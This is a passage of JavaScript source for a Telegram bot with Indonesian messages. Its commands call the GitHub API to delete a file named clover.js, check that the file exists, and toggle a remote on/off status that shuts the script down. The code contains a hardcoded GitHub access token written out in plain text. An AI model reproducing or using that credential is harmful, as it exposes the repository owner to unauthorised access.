        "Authorization": `token ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      }
    });

    if (res.status === 404) {
      return ctx.reply(`⚠️ File **${fileName}** tidak ditemukan di GitHub.`);
    }

    const data = await res.json();

    const del = await fetch(apiURL, {
      method: "DELETE",
      headers: {
        "Authorization": `token ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      },
      body: JSON.stringify({
        message: `Delete ${fileName} via bot`,
        sha: data.sha,
        branch: GITHUB_BRANCH
      })
    });

    if (!del.ok) return ctx.reply("❌ Gagal menghapus file di GitHub.");

    ctx.reply(`🗑️ File **${fileName}** berhasil dihapus dari GitHub!`);

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Error saat menghapus file.");
  }
});

bot.command("delfile", async (ctx) => {
  try {
    const fileName = "clover.js";
    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents/${fileName}?ref=${GITHUB_BRANCH}`;

    const res = await fetch(apiURL, {
      headers: {
        "Authorization": `token ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      }
    });

    if (res.status === 404) {
      return ctx.reply(`⚠️ File **${fileName}** tidak ditemukan di GitHub.`);
    }

    const data = await res.json();

    const del = await fetch(apiURL, {
      method: "DELETE",
      headers: {
        "Authorization": `token ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      },
      body: JSON.stringify({
        message: `Delete ${fileName} via bot`,
        sha: data.sha,
        branch: GITHUB_BRANCH
      })
    });

    if (!del.ok) return ctx.reply("❌ Gagal menghapus file di GitHub.");

    ctx.reply(`🗑️ File **${fileName}** berhasil dihapus dari GitHub!`);

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Error saat menghapus file.");
  }
});

bot.command("cekfile", async (ctx) => {
  const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents?ref=${GITHUB_BRANCH}`;

  try {
    const res = await fetch(apiURL, {
      headers: {
        "User-Agent": "Telegram-Bot",
        "Accept": "application/vnd.github.v3+json"
      }
    });

    if (!res.ok) return ctx.reply("❌ Tidak dapat mengakses GitHub.");

    const files = await res.json();
    const target = files.find(f =>
      f.name.toLowerCase().includes("clover") && f.name.endsWith(".js")
    );

    if (!target) return ctx.reply("❌ File *clover.js* tidak ditemukan di GitHub.");

    ctx.reply(`✅ File ditemukan di GitHub:\n📄 *${target.name}*`, {
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error cek file.");
  }
});

const GITHUB_FILE = 'BealGejsuzo/privde'; 
const GITHUB_TSAJA = "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";
bot.command("ceksc", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const command = args[1]?.toLowerCase();
    
    if (!command || (command !== "on" && command !== "off")) {
      return ctx.reply("⚠️ Gunakan: /ceksc on atau /ceksc off");
    }
    
    const apiURL = `https://api.github.com/repos/${GITHUB_FILE}/contents/ceksc.json`;
    
    // Cek file sudah ada atau belum
    let sha = null;
    const getRes = await fetch(apiURL, {
      headers: { "Authorization": `token ${GITHUB_TSAJA}` }
    });
    
    if (getRes.ok) {
      const data = await getRes.json();
      sha = data.sha;
    }
    
    // Buat file dengan status baru
    const content = Buffer.from(JSON.stringify({ status: command })).toString('base64');
    
    const putRes = await fetch(apiURL, {
      method: "PUT",
      headers: {
        "Authorization": `token ${GITHUB_TSAJA}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        message: `Set status to ${command}`,
        content: content,
        sha: sha,
        branch: GITHUB_BRANCH
      })
    });
    
    if (!putRes.ok) {
      const error = await putRes.json();
      
      return ctx.reply(`❌ Gagal update status: ${error.message}`);
    }
    
    if (command === "off") {
      await ctx.reply("🛑 Script telah dimatikan (OFF)");
      setTimeout(() => process.exit(0), 2000);
    } else {
      await ctx.reply("✅ Script telah dihidupkan (ON)");
    }
    
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan");
  }
});
//Kode Error
//END DISINI
bot.launch()
